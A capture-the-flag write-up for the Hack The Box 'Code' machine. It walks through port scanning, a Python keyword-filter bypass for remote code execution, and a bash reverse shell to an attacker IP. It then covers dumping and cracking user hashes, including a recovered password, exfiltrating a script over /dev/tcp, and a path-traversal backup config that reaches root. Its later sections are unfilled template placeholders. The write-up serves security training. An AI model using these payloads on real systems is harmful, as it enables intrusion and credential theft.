### Hack The Box Writeup: Code

## Overview

- **Machine Name**: Code
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: August 2025

## Tools Used

- **Enumeration**: 
- **Exploitation**: 
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
ping -c 1 10.10.11.62

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn -oG allPorts 10.10.11.62
nmap -sCV -p22,5000 -oN targeted 10.10.11.62

whatweb http://10.10.11.62:5000

```

### Exploitation
#### Using python

```py
# built in functions
test = getattr(print.__self__, '__import__')('os')
test.system('whoami')

getattr(test, 'system')('whoami')

# BUt, the web doesn't permit to use keyword. Then, we have to concatenate the string
test = getattr(print.__self__, '__im' + 'port__')('o' + 's')
getattr(test, 'sys' + 'tem')('whoami')

# TO view results, we need icmp
tcpdump -i tun0 icmp -n # local machine

getattr(test, 'sys' + 'tem')('ping -c 1 10.10.16.5') # atacker ip

# We can use RCE
nc -nlvp 443
getattr(test, 'sys' + 'tem')('bash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"')

```

### Privilege Escalation

```bash
script /dev/null -c bash
ctrl + z

stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash

find . # to view all files in current dir
cd ./instance

file database.db
sqlite3 database.db
.tables

select * from user;
# ans
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be

# de-hashed in hashes.com
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster

ssh martin@10.10.11.62

id
sudo -l
# ans
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh

nc -nlvp 443 > backy.sh # localmachine
cat /usr/bin/backy.sh > /dev/tcp/10.10.16.5/443

# rewrite json file using path traversal
{
	"destination": "/home/martin/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/....//root"
	]
}

sudo /usr/bin/backy.sh task.json

tar-xf code.tar.gz
cd root
cat root.txt

```
## Challenges Faced


- **Challenge 1**: \[e.g., Nmap scans were blocked by a firewall.\]
  - **Solution**: \[e.g., Used --script-args to bypass restrictions.\]
- **Challenge 2**: \[e.g., Password cracking took too long.\]
  - **Solution**: \[e.g., Optimized wordlist with custom rules in Hashcat.\]

## Lessons Learned

\[Summarize key takeaways from solving the machine.\]

- Learned to identify \[specific vulnerability, e.g., outdated Samba versions\] through thorough enumeration.
- Improved skills in \[technique, e.g., manual exploit development for CVE-XXXX-XXXX\].
- Gained experience with \[tool, e.g., LinPEAS for privilege escalation\].

## References

- \[Link to HTB machine page, e.g., https://app.hackthebox.com/machines/Lame\]
- \[CVE details, e.g., https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX\]
- \[Tool documentation, e.g., https://nmap.org/book/man.html\]
- \[Relevant blog post or tutorial, e.g., https://example.com/samba-exploit-guide\]

---

*Written by YourName, 08.2025. Feedback welcome at github.com/edibauer.*